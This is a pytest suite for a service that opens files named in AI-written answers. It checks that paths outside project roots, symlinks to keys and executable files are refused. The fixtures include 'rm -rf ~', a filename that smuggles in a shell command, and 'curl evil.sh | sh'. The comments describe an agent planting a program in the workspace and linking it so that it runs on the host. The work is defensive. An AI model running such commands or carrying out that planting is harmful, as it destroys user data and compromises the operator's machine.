"""Opening a file from an answer — `services/host_open` and `POST /host/open`.

The path this route takes comes from a click on *model-written prose*, so the tests that
matter most are the refusals: the containment fence, and what happens on a host with
nothing to open a file with. The opener itself is stubbed everywhere — a test suite must
never launch an application on the machine it runs on.

The second fence — what the host would *run* rather than show — has its own suite in
`test_host_open_policy.py`; what is asserted here is that resolution runs it, on the
resolved path, before anything reaches an opener.
"""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest

from core.exceptions import InvalidInputError, NotFoundError, PermissionDeniedError
from services import host_open
from services.host_open import Opener
from tests._helpers import client_app
from tests._json import json_body, s

#: How long a "still attached to its editor" opener stays attached, in a test that has
#: to outlive the launch timeout without making the suite wait for a real one.
_HANG_S = 0.15


class _FakeProc:
    """An opener that has already finished — or one that is still holding its editor."""

    def __init__(self, code: int, *, hangs: bool = False) -> None:
        self._code: int = code
        self._hangs: bool = hangs

    async def wait(self) -> int:
        if self._hangs:
            await asyncio.sleep(_HANG_S)
        return self._code


def _spawns(monkeypatch: pytest.MonkeyPatch, proc: _FakeProc) -> list[list[str]]:
    """Record every argv the opener would have spawned, and spawn nothing."""
    seen: list[list[str]] = []

    async def fake_exec(*argv: str, **_kwargs: object) -> _FakeProc:
        seen.append(list(argv))
        return proc

    monkeypatch.setattr(asyncio, "create_subprocess_exec", fake_exec)
    return seen


class TestResolveWithin:
    def test_a_relative_path_resolves_against_the_first_root_that_has_it(self, tmp_path: Path):
        first, second = tmp_path / "a", tmp_path / "b"
        (first / "src").mkdir(parents=True)
        (second / "src").mkdir(parents=True)
        _ = (second / "src/app.py").write_text("x")
        assert host_open.resolve_within([first, second], "src/app.py") == second / "src/app.py"

    def test_an_absolute_path_is_accepted_when_it_is_inside_a_root(self, tmp_path: Path):
        root = tmp_path / "proj"
        root.mkdir()
        _ = (root / "note.md").write_text("x")
        assert host_open.resolve_within([root], str(root / "note.md")) == root / "note.md"

    def test_a_directory_opens_as_readily_as_a_file(self, tmp_path: Path):
        root = tmp_path / "proj"
        (root / "src").mkdir(parents=True)
        assert host_open.resolve_within([root], "src") == root / "src"

    def test_an_absolute_path_outside_every_root_is_refused(self, tmp_path: Path):
        # The case the whole fence exists for: an answer naming a file on the host that
        # has nothing to do with the operator's projects.
        root = tmp_path / "proj"
        root.mkdir()
        with pytest.raises(PermissionDeniedError):
            _ = host_open.resolve_within([root], "/etc/passwd")

    def test_traversal_out_of_a_root_is_refused(self, tmp_path: Path):
        root = tmp_path / "proj"
        root.mkdir()
        _ = (tmp_path / "secret.txt").write_text("x")
        with pytest.raises(PermissionDeniedError):
            _ = host_open.resolve_within([root], "../secret.txt")

    def test_a_symlink_pointing_out_of_a_root_is_refused(self, tmp_path: Path):
        # Containment is judged on where the path *lands*, not on where it is written:
        # an agent-authored `notes.md` inside the project is a link to the operator's
        # keys, and the fence has to follow it to see that.
        root = tmp_path / "proj"
        root.mkdir()
        _ = (tmp_path / "id_rsa").write_text("x")
        (root / "notes.md").symlink_to(tmp_path / "id_rsa")
        with pytest.raises(PermissionDeniedError):
            _ = host_open.resolve_within([root], "notes.md")

    def test_a_symlink_to_something_executable_is_judged_by_its_target(self, tmp_path: Path):
        # Both fences read the resolved path, so a readable-looking name cannot borrow
        # the type of a file the host would run.
        root = tmp_path / "proj"
        root.mkdir()
        _ = (root / "build.command").write_text("#!/bin/sh\n")
        (root / "notes.md").symlink_to(root / "build.command")
        with pytest.raises(PermissionDeniedError, match="only text, source and documents"):
            _ = host_open.resolve_within([root], "notes.md")

    def test_a_contained_file_the_host_would_run_is_refused(self, tmp_path: Path):
        # The case containment cannot answer: the agent writes into these roots, so a
        # path can be entirely inside the operator's project and still be a program.
        root = tmp_path / "proj"
        root.mkdir()
        _ = (root / "build-results.command").write_text("#!/bin/sh\nrm -rf ~\n")
        with pytest.raises(PermissionDeniedError, match="only text, source and documents"):
            _ = host_open.resolve_within([root], "build-results.command")

    def test_with_no_projects_at_all_nothing_is_openable(self):
        with pytest.raises(PermissionDeniedError):
            _ = host_open.resolve_within([], "src/app.py")

    def test_a_contained_path_that_is_gone_is_a_miss_not_a_refusal(self, tmp_path: Path):
        # Distinct answers on purpose: a stale path in an old answer is a 404, while a
        # path outside the projects is a 403. Collapsing them would hide the fence.
        root = tmp_path / "proj"
        root.mkdir()
        with pytest.raises(NotFoundError):
            _ = host_open.resolve_within([root], "src/gone.py")

    def test_an_empty_path_is_rejected_before_anything_is_searched(self, tmp_path: Path):
        with pytest.raises(InvalidInputError):
            _ = host_open.resolve_within([tmp_path], "   ")


class TestOpener:
    async def test_the_path_is_one_argument_never_a_command_line(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        monkeypatch.setattr(host_open, "resolve", lambda: Opener("open", "open"))
        seen = _spawns(monkeypatch, _FakeProc(0))
        target = tmp_path / "a file; rm -rf ~.txt"
        await host_open.open_path(target)
        assert seen == [["open", str(target)]]

    async def test_gio_takes_its_verb_as_a_subcommand(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        # The one argv that isn't `<program> <path>`; getting it wrong would open
        # nothing on a desktop that has gio and no xdg-open.
        monkeypatch.setattr(host_open, "resolve", lambda: Opener("gio", "gio"))
        seen = _spawns(monkeypatch, _FakeProc(0))
        await host_open.open_path(tmp_path / "f.txt")
        assert seen == [["gio", "open", str(tmp_path / "f.txt")]]

    async def test_a_host_with_no_opener_says_so(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        monkeypatch.setattr(host_open, "resolve", lambda: None)
        with pytest.raises(RuntimeError):
            await host_open.open_path(tmp_path / "f.txt")

    async def test_a_failed_open_is_reported_rather_than_swallowed(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        monkeypatch.setattr(host_open, "resolve", lambda: Opener("xdg-open", "xdg-open"))
        _ = _spawns(monkeypatch, _FakeProc(3))
        with pytest.raises(RuntimeError, match="no application is registered"):
            await host_open.open_path(tmp_path / "f.txt")

    async def test_explorers_nonzero_exit_is_not_a_failure(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        # `explorer` reports a nonzero exit on a perfectly successful open, so reading
        # its code as a failure would make every Windows open look broken.
        monkeypatch.setattr(host_open, "resolve", lambda: Opener("explorer", "explorer"))
        _ = _spawns(monkeypatch, _FakeProc(1))
        await host_open.open_path(tmp_path / "f.txt")

    async def test_an_opener_still_attached_to_its_application_is_a_success(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        # Some handlers stay attached to the editor they launched. The file is open;
        # waiting for the editor to be closed would hang the request.
        monkeypatch.setattr(host_open, "_LAUNCH_TIMEOUT_S", 0.05)
        monkeypatch.setattr(host_open, "resolve", lambda: Opener("open", "open"))
        _ = _spawns(monkeypatch, _FakeProc(0, hangs=True))
        await host_open.open_path(tmp_path / "f.txt")
        # The wait carries on behind the request rather than being dropped, so the child
        # is reaped when the editor finally exits.
        assert host_open.reapers
        await asyncio.sleep(_HANG_S * 2)
        assert not host_open.reapers


class TestOpenRoute:
    @staticmethod
    def _records(monkeypatch: pytest.MonkeyPatch) -> list[Path]:
        opened: list[Path] = []

        async def fake_open(target: Path) -> None:
            opened.append(target)

        monkeypatch.setattr("services.host_open.open_path", fake_open)
        return opened

    async def test_a_project_file_is_opened_and_named_back(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        opened = self._records(monkeypatch)
        async with client_app() as (client, _app):
            root = tmp_path / "acme-api"
            (root / "src").mkdir(parents=True)
            _ = (root / "src/app.py").write_text("x")
            _ = await client.post("/projects/ensure", json={"rootPath": str(root)})

            resp = await client.post("/host/open", json={"path": "src/app.py"})
            assert resp.status_code == 200, resp.text
            assert json_body(resp)["path"] == str(root / "src/app.py")
            assert opened == [root / "src/app.py"]

    async def test_a_file_named_by_its_home_path_opens_from_its_project(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        opened = self._records(monkeypatch)
        async with client_app() as (client, _app):
            root = tmp_path / "acme-api"
            (root / "src").mkdir(parents=True)
            _ = (root / "src/app.py").write_text("x")
            _ = await client.post("/projects/ensure", json={"rootPath": str(root)})

            for path in ("~/projects/acme-api/src/app.py", "projects/acme-api/src/app.py"):
                resp = await client.post("/host/open", json={"path": path})
                assert resp.status_code == 200, resp.text
            assert opened == [root / "src/app.py"] * 2
            # The home path is read inside the project it names, so it cannot climb out.
            resp = await client.post(
                "/host/open", json={"path": "~/projects/acme-api/../../etc/passwd"}
            )
            assert resp.status_code in (403, 404), resp.text
            assert len(opened) == 2

    async def test_a_path_outside_every_project_is_a_403(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        opened = self._records(monkeypatch)
        async with client_app() as (client, _app):
            root = tmp_path / "acme-api"
            root.mkdir()
            _ = (tmp_path / "id_rsa").write_text("x")
            _ = await client.post("/projects/ensure", json={"rootPath": str(root)})

            resp = await client.post("/host/open", json={"path": str(tmp_path / "id_rsa")})
            assert resp.status_code == 403, resp.text
            assert opened == []

    async def test_an_agent_written_program_inside_a_project_is_a_403(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        # The whole attack in one request: a file the agent could write with an ordinary
        # workspace-write, linked from its own prose under any words it likes, inside a
        # genuine project root. Nothing may reach the opener.
        opened = self._records(monkeypatch)
        async with client_app() as (client, _app):
            root = tmp_path / "acme-api"
            root.mkdir()
            _ = (root / "build-results.command").write_text("#!/bin/sh\ncurl evil.sh | sh\n")
            _ = await client.post("/projects/ensure", json={"rootPath": str(root)})

            resp = await client.post("/host/open", json={"path": "build-results.command"})
            assert resp.status_code == 403, resp.text
            assert "text, source and documents" in s(json_body(resp)["detail"])
            assert opened == []

    async def test_the_active_project_is_searched_first(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        # Two projects carrying the same relative file. The one the operator is working
        # in is the one they meant.
        opened = self._records(monkeypatch)
        async with client_app() as (client, _app):
            ids: list[str] = []
            for name in ("first", "second"):
                root = tmp_path / name
                root.mkdir()
                _ = (root / "README.md").write_text("x")
                ensured = await client.post("/projects/ensure", json={"rootPath": str(root)})
                ids.append(s(json_body(ensured)["id"]))
            _ = await client.post(f"/projects/{ids[0]}/activate")

            _ = await client.post("/host/open", json={"path": "README.md"})
            assert opened == [tmp_path / "first" / "README.md"]

    async def test_a_host_with_no_opener_answers_409(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        monkeypatch.setattr("services.host_open.resolve", lambda: None)
        async with client_app() as (client, _app):
            root = tmp_path / "acme-api"
            root.mkdir()
            _ = (root / "README.md").write_text("x")
            _ = await client.post("/projects/ensure", json={"rootPath": str(root)})

            resp = await client.post("/host/open", json={"path": "README.md"})
            assert resp.status_code == 409, resp.text
            assert json_body(resp)["detail"]
